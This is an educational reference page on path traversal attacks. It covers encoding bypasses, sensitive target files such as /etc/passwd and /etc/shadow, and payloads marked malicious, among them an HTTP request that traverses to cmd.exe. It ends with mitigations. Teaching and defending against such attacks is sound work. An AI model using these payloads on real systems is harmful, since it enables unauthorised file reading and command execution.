# Attack Classes - Path Traversal

Path Traversal or Directory Traversal allows attackers to access files not intended for user access by manipulating file paths. Attackers access restricted directories and execute commands outside of the web server’s root directory.

These user supplied inputs can be:
- Query parameters
- Cookies
- API parameters
- Headers
- PHP Wrappers
- etc.

Path Traversal attack mirrors Local File Inclusion (LFI), which abuse user-controlled file paths to read or execute files outside the intended directory.

## Characteristics

These are the common characteristics that define a Path Traversal attack.

- Vulnerable systems can be manipulated to step out of root directory
- Use of default/ specific scripts to traverse directories
- Use of URL encoding/ obfuscation can serve as a web server escape code
- Abuse of Access Control List


### Common Special Characters
- %00 - Null byte injection
- `..` - Parent directory
- ..// - Nested sequences
- %5c - URL-encode representing `\`
- %2e - URL-encode for `.`
- %2f - URL-encode for `/`
- %252e - Double URL-encode for `.`
- %252f - Double URL-encode `/`
- `%u002e` - Unicode encoding for `.`
- `%u2215` - Unicode encoding for `/`
- `%u2216` - Unicode encoding for `\`
- `%c0%2e` - Overlong UTF-8 Unicode Encoding for `.`
- `%e0%40%ae` - Overlong UTF-8 Unicode Encoding for `.`
- `%c0%ae` - Overlong UTF-8 Unicode Encoding for `.`
- `%c0%af` - Overlong UTF-8 Unicode Encoding for `/`
- `%e0%80%af` - Overlong UTF-8 Unicode Encoding for `/`
- `%c0%2f` - Overlong UTF-8 Unicode Encoding for `/`
- `%c0%5c` - Overlong UTF-8 Unicode Encoding for `\`
- `%c0%80%5c` - Overlong UTF-8 Unicode Encoding for `\`

### Common Payloads

Here are some common Path Traversal payloads:

**Linux**
```
/etc/passwd
/etc/shadow
/etc/nginx/nginx.conf
/proc/self/environ
/var/log/apache2/error.log
```

**Windows**
```
boot.ini
win.ini
\etc\hosts
/C:\Windows\php.ini
/C:\Program Files\Apache Group\Apache2\conf\httpd.conf
```

**API**
```

```

### Payload Examples

[MALICIOUS] *Basic Traveral*
```
/../../{FILE}
```

[MALICIOUS] *Null Byte Injection*
```
../../etc/passwd%00index.htm
```

[MALICIOUS] *Directory Traversal attack via web server*
```
GET http://server.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\ HTTP/1.1
Host: server.com
```

[MALICIOUS] *Directory Traversal attack via web application code*
```
GET http://test.webarticles.com/show.asp?view=../../../../../Windows/system.ini HTTP/1.1
Host: test.webarticles.com
```

### Obfuscation Techniques
Special character | URL-encoded form | Purpose | Bypassed By |

|-------------------|------------------|---------|-------------|

| `.` (Period) | `%252e%252e` | Double encoding bypass | `../etc/passwd` |

| `#` (Fragment) | `%23` | PHP ZIP wrapper bypass | `zip:///filename_path#internal_filename` |

| `/` (Forward Slash) | `%2f` | Percentage encoding bypass | `..%2f../etc/passwd` |

| `%u` (Unicode) | `%u2215` | Unicode encoding bypass | `..%u2215boot.ini` |

| `%00` (Null character) | `%00` | Null byte/ Ignore | `%00/etc/passwd%00`|

## Mitigations

- User Restriction: Never pass raw user input to file system APIs
- API Fuzzing: Specialized fuzzers that focuses on web application attack surfaces to find vulnerable parameters.
- Web Vulnerability Scanner: Crawls your entire website and automatically checks for directory traversal vulnerabilities.
- Patch and Update: Regularly update web servers and application code.

**References:**
* [Directory Traversal](https://www.acunetix.com/websitesecurity/directory-traversal/)
* [Cheatsheet](https://www.vulnsy.com/cheat-sheets/lfi)
* [Path Traversal API](https://www.apisec.ai/blog/path-traversal-in-apis-detection-and-prevention)
* [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)